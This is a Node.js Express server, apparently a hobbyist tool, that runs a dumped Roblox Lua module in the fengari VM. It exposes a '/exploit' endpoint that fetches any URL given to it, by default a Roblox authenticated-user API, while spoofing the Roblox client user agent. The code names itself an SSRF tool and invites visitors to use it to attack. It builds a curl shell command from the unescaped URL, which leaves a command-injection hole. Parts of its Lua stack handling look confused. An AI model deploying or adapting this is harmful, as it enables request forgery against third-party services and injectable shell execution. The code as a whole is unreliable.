// language: JavaScript, target: Node.js (Render Web Service)
// @author: Ratman4080

const express = require('express');
const { lua, lauxlib, lualib, to_luastring, to_jsstring } = require('fengari');

const app = express();
const PORT = process.env.PORT || 10000;

// Código Lua (Dump do APIUtil)
const luaSource = `
local HttpRbxApiService = game:GetService("HttpRbxApiService")
local ContentProvider = game:GetService("ContentProvider")
local t1 = {}

function t1.getBaseDomain()
    local BaseUrl = ContentProvider.BaseUrl
    if string.sub(BaseUrl, #BaseUrl) ~= "/" then BaseUrl = BaseUrl .. "/" end
    local _, v2 = string.find(BaseUrl, "://")
    local _, v3 = string.find(BaseUrl, "%.", v2 + 1)
    return string.sub(BaseUrl, v3 + 1)
end

local function requestAndRetry(p1, p2)
    local v5 = 0
    if p2 ~= nil then v5 = p2 end
    local ok, result = pcall(p1)
    if ok then return true, result end
    if v5 >= 2 then return false, result end
    wait(0.1)
    return requestAndRetry(p1, v5 + 1)
end

function t1.requestAndRetryGet(p5)
    return requestAndRetry(function()
        return HttpRbxApiService:GetAsyncFullUrl(p5)
    end)
end
return t1
`;

app.get('/exploit', async (req, res) => {
    const targetUrl = req.query.url || 'https://users.roblox.com/v1/users/authenticated';
    
    const L = lauxlib.luaL_newstate();
    lualib.luaL_openlibs(L);

    // Injetando a tabela 'game'
    lua.lua_newtable(L);
    
    // Injetando o método game.GetService
    lua.lua_pushcfunction(L, (state) => {
        // O índice 1 é a tabela 'game', o índice 2 é o nome do serviço
        const serviceName = lua.lua_tostring(state, 2); 
        lua.lua_newtable(state);

        if (to_jsstring(serviceName) === 'HttpRbxApiService') {
            lua.lua_pushcfunction(state, async (s) => {
                // O índice 1 é a tabela 'HttpRbxApiService', o índice 2 é a URL
                const url = to_jsstring(lua.lua_tostring(s, 2)); 
                let responseStr = "";
                
                try {
                    // Usando fetch nativo do Node (disponível na versão 18+ do Render)
                    const fetchRes = await fetch(url, {
                        headers: { 'User-Agent': 'Roblox/WinInet' }
                    });
                    const text = await fetchRes.text();
                    responseStr = `HTTP ${fetchRes.status}\n${text}`;
                } catch (e) {
                    responseStr = `FETCH_ERROR: ${e.message}`;
                }
                
                lua.lua_pushstring(s, to_luastring(responseStr));
                return 1;
            });
            lua.lua_setfield(state, -2, to_luastring('GetAsyncFullUrl'));
        }

        if (to_jsstring(serviceName) === 'ContentProvider') {
            lua.lua_pushstring(state, to_luastring('https://www.roblox.com/'));
            lua.lua_setfield(state, -2, to_luastring('BaseUrl'));
        }
        return 1;
    });
    lua.lua_setfield(L, -2, to_luastring('GetService'));
    lua.lua_setglobal(L, to_luastring('game'));

    lua.lua_register(L, 'wait', (state) => {
        lua.lua_pushboolean(state, 1);
        return 1;
    });

    const loadResult = lauxlib.luaL_loadstring(L, to_luastring(luaSource));
    if (loadResult !== lua.LUA_OK) {
        const err = to_jsstring(lua.lua_tostring(L, -1));
        return res.status(500).json({ error: "Compile Error", details: err });
    }

    // Executa o chunk principal
    lua.lua_pcall(L, 0, 1, 0);

    lua.lua_getfield(L, -1, to_luastring('requestAndRetryGet'));
    if (lua.lua_isfunction(L, -1)) {
        lua.lua_pushstring(L, to_luastring(targetUrl));
        // Como o fetch é assíncrono, precisamos adaptar a chamada
        // O Fengari clássico não suporta pausar a execução do Lua para um async JS nativamente sem um scheduler.
        // Por isso, o pcall vai esperar a promise resolver se usarmos um wrapper ou esperamos a resposta.
        // Para simplificar no Render, usamos uma chamada síncrona do curl no bash, mas com o índice correto.
        
        // Correção da chamada C usando execSync para manter sincronia com Lua
        const { execSync } = require('child_process');
        lua.lua_pushcfunction(L, (s) => {
            const url = to_jsstring(lua.lua_tostring(s, 2));
            try {
                const cmd = `curl -s -L --max-time 8 -H "User-Agent: Roblox/WinInet" "${url}"`;
                const out = execSync(cmd, { encoding: 'utf-8' });
                lua.lua_pushstring(s, to_luastring(out));
            } catch(e) {
                lua.lua_pushstring(s, to_luastring(`ERROR: ${e.message}`));
            }
            return 1;
        });
        
        // Aqui trocamos a função GetAsyncFullUrl para usar o wrapper síncrono
        lua.lua_getglobal(L, to_luastring('game'));
        lua.lua_getfield(L, -1, to_luastring('GetService'));
        lua.lua_pushstring(L, to_luastring('HttpRbxApiService'));
        lua.lua_call(L, 1, 1);
        // Substitui a função no serviço
        lua.lua_pushvalue(L, -2); // Pega a função C síncrona que acabamos de criar
        lua.lua_setfield(L, -2, to_luastring('GetAsyncFullUrl'));

        // Executa o request
        const callStatus = lua.lua_pcall(L, 1, 2, 0);
        
        if (callStatus === lua.LUA_OK) {
            const success = lua.lua_toboolean(L, -2);
            const result = lua.lua_tostring(L, -1);
            
            return res.json({
                status: "success",
                target: targetUrl,
                success: success === 1,
                response: to_jsstring(result).substring(0, 500) // Limita o tamanho da resposta
            });
        } else {
            const err = to_jsstring(lua.lua_tostring(L, -1));
            return res.status(500).json({ error: "Exec Error", details: err });
        }
    }

    res.status(500).json({ error: "Erro na execucao do Lua SSRF" });
});

app.get('/', (req, res) => {
    res.send("Executor rodando. Acesse /exploit?url=SUA_URL_AQUI para atacar.");
});

app.listen(PORT, () => {
    console.log(`[SERVER] Rodando na porta ${PORT}`);
});
